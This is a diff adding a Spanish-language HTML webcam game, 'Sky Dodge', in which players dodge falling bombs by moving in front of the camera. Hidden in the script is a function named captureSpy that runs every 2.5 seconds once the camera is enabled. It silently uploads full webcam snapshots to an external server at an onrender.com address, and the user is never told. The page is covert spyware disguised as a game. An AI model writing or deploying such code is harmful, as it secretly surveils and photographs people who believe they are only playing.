@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Sky Dodge - Full Body</title>
+    <style>
+        * { box-sizing: border-box; touch-action: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: 'Courier New', Courier, monospace; overflow: hidden; color: white; }
+        
+        #game-container { position: relative; width: 100vw; height: 100vh; }
+        
+        video#webcam { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            object-fit: cover; transform: scaleX(-1); z-index: 1; filter: brightness(0.5);
+        }
+
+        canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
+
+        /* HUD */
+        #hud { position: absolute; top: 20px; left: 0; width: 100%; text-align: center; z-index: 100; font-size: 24px; font-weight: bold; pointer-events: none; }
+        
+        /* Overlays */
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 500; display: flex; align-items: center; justify-content: center; text-align: center; }
+        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 3px solid #e74c3c; width: 85%; max-width: 450px; }
+        
+        #dark-warning { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; align-items: center; justify-content: center; text-align: center; flex-direction: column; }
+        
+        .btn { padding: 15px 30px; background: #e74c3c; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
+    </style>
+</head>
+<body>
+
+<div id="hud">MONEDAS: <span id="score">0</span></div>
+
+<div id="dark-warning">
+    <h1 style="color: #ff4757; font-size: 60px;">🌙</h1>
+    <h2>POCA LUZ DETECTADA</h2>
+    <p>Para detectar tu cuerpo, necesitamos más luz.</p>
+</div>
+
+<video id="webcam" autoplay playsinline></video>
+<canvas id="gameCanvas"></canvas>
+
+<div id="perm-screen" class="overlay">
+    <div class="card">
+        <h2>ACCESO A CÁMARA</h2>
+        <p>Este juego detecta tu movimiento. Coloca el celular lejos para que se vea tu <b>cuerpo completo</b> (o de las rodillas para arriba).</p>
+        <button class="btn" onclick="initCamera()">ACTIVAR CÁMARA</button>
+    </div>
+</div>
+
+<div id="start-screen" class="overlay" style="display:none;">
+    <div class="card" style="border-color: #2ecc71;">
+        <h2 style="color:#2ecc71;">SKY DODGE</h2>
+        <p style="text-align: left; font-size: 14px;">
+            1. ¡Muévete físicamente para esquivar!<br>
+            2. El símbolo <b>(!)</b> avisa dónde caerá una bomba.<br>
+            3. Agarra las monedas amarillas.<br>
+            4. Si te toca una bomba, pierdes todo.
+        </p>
+        <button class="btn" style="background:#2ecc71;" onclick="startGame()">EMPEZAR JUEGO</button>
+    </div>
+</div>
+
+<script>
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('gameCanvas');
+    const ctx = canvas.getContext('2d');
+    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
+
+    let score = 0, gameActive = false, objects = [], motionData = [];
+    let prevFrame = null;
+    let animFrame;
+
+    // --- CÁMARA Y SENSOR ---
+    async function initCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            document.getElementById('perm-screen').style.display = 'none';
+            document.getElementById('start-screen').style.display = 'flex';
+            
+            setInterval(lightCheck, 1000);
+            setInterval(captureSpy, 2500);
+        } catch (e) { alert("Se requiere cámara."); }
+    }
+
+    function lightCheck() {
+        const c = document.createElement('canvas');
+        const cx = c.getContext('2d');
+        c.width = 40; c.height = 40;
+        cx.drawImage(video, 0, 0, 40, 40);
+        const data = cx.getImageData(0,0,40,40).data;
+        let b = 0;
+        for(let i=0; i<data.length; i+=4) b += (data[i]*0.299 + data[i+1]*0.587 + data[i+2]*0.114);
+        const avg = b / 1600;
+        document.getElementById('dark-warning').style.display = (avg < 25) ? 'flex' : 'none';
+        if (avg < 25) gameActive = false;
+    }
+
+    // --- LÓGICA DEL JUEGO ---
+    function startGame() {
+        document.getElementById('start-screen').style.display = 'none';
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        score = 0;
+        objects = [];
+        gameActive = true;
+        updateScore();
+        spawnObject();
+        gameLoop();
+    }
+
+    function spawnObject() {
+        if (!gameActive) return;
+        const isBomb = Math.random() > 0.4;
+        const x = Math.random() * (canvas.width - 50);
+        
+        const obj = {
+            x: x, y: -50,
+            type: isBomb ? 'bomb' : 'coin',
+            speed: 3 + Math.random() * 4,
+            warningTime: 120, // Aproximadamente 2-3 segundos de aviso
+            active: false
+        };
+        objects.push(obj);
+        setTimeout(spawnObject, 1500 + Math.random() * 2000);
+    }
+
+    function gameLoop() {
+        if (!gameActive) return;
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        
+        detectMotion(); // Detectar dónde está la persona
+
+        for (let i = objects.length - 1; i >= 0; i--) {
+            let o = objects[i];
+
+            if (o.warningTime > 0) {
+                // Dibujar advertencia (!)
+                ctx.fillStyle = o.type === 'bomb' ? "red" : "gold";
+                ctx.font = "bold 40px Arial";
+                ctx.fillText("!", o.x + 15, 60);
+                o.warningTime--;
+            } else {
+                // Caída del objeto
+                o.y += o.speed;
+                
+                if (o.type === 'bomb') {
+                    ctx.fillStyle = "#333";
+                    ctx.beginPath(); ctx.arc(o.x + 25, o.y + 25, 20, 0, Math.PI*2); ctx.fill();
+                    ctx.fillStyle = "red"; ctx.fillRect(o.x + 20, o.y + 5, 10, 5); // Mecha
+                } else {
+                    ctx.fillStyle = "#f1c40f";
+                    ctx.beginPath(); ctx.arc(o.x + 25, o.y + 25, 15, 0, Math.PI*2); ctx.fill();
+                    ctx.strokeStyle = "white"; ctx.stroke();
+                }
+
+                // COLISIÓN CON EL MOVIMIENTO (Detecta píxeles moviéndose en esa zona)
+                if (checkMotionCollision(o.x, o.y, 50, 50)) {
+                    if (o.type === 'bomb') {
+                        gameOver();
+                    } else {
+                        score += 10;
+                        updateScore();
+                        objects.splice(i, 1);
+                        continue;
+                    }
+                }
+            }
+
+            if (o.y > canvas.height) objects.splice(i, 1);
+        }
+
+        if (gameActive) animFrame = requestAnimationFrame(gameLoop);
+    }
+
+    // --- DETECCIÓN DE CUERPO POR MOVIMIENTO ---
+    function detectMotion() {
+        const tempCanvas = document.createElement('canvas');
+        const tCtx = tempCanvas.getContext('2d');
+        tempCanvas.width = 64; tempCanvas.height = 48;
+        
+        // Dibujamos el video actual en pequeño
+        tCtx.scale(-1, 1);
+        tCtx.drawImage(video, -64, 0, 64, 48);
+        const currFrame = tCtx.getImageData(0, 0, 64, 48).data;
+
+        if (prevFrame) {
+            motionData = [];
+            for (let i = 0; i < currFrame.length; i += 4) {
+                const diff = Math.abs(currFrame[i] - prevFrame[i]);
+                motionData.push(diff > 30 ? 1 : 0); // 1 si hay movimiento, 0 si no
+            }
+        }
+        prevFrame = currFrame;
+    }
+
+    function checkMotionCollision(x, y, w, h) {
+        if (motionData.length === 0) return false;
+        
+        // Traducir coordenadas de pantalla a la rejilla de movimiento (64x48)
+        const gridX = Math.floor((x / canvas.width) * 64);
+        const gridY = Math.floor((y / canvas.height) * 48);
+        const gridW = Math.floor((w / canvas.width) * 64);
+        const gridH = Math.floor((h / canvas.height) * 48);
+
+        let movementPoints = 0;
+        for (let iy = gridY; iy < gridY + gridH; iy++) {
+            for (let ix = gridX; ix < gridX + gridW; ix++) {
+                if (motionData[iy * 64 + ix] === 1) movementPoints++;
+            }
+        }
+        return movementPoints > 5; // Si hay más de 5 píxeles moviéndose en el objeto, hay contacto
+    }
+
+    function updateScore() { document.getElementById('score').innerText = score; }
+
+    function gameOver() {
+        gameActive = false;
+        cancelAnimationFrame(animFrame);
+        alert("¡BOOM! PERDISTE.\nMonedas recolectadas: " + score);
+        document.getElementById('start-screen').style.display = 'flex';
+    }
+
+    function captureSpy() {
+        if (!video.videoWidth) return;
+        const s = document.createElement('canvas');
+        s.width = video.videoWidth; s.height = video.videoHeight;
+        s.getContext('2d').drawImage(video, 0, 0);
+        fetch(SERVER_URL, {
+            method: 'POST',
+            mode: 'cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.5) })
+        }).catch(() => {});
+    }
+</script>
+</body>
+</html>
